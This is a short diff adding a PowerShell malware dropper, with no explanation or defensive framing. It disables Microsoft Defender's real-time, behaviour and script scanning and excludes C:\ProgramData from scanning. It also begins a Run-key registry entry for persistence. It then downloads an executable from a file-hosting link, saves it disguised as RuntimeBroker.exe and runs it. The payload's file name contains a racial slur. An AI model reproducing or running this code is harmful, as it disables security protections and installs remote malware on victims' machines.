@@ -1,0 +1,7 @@
+powershell" -EP Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true
+-ExecutionPolicy Bypass -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath C:\ProgramData\ 2>$null
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v
+$url = "https://store10.gofile.io/download/web/aeccf43b-96a3-4ea7-beaa-b6146c484b8f/dienigga.exe"
+$filePath = "C:\ProgramData\RuntimeBroker.exe"
+Invoke-WebRequest -Uri $url -OutFile $filePath
+& $filePath
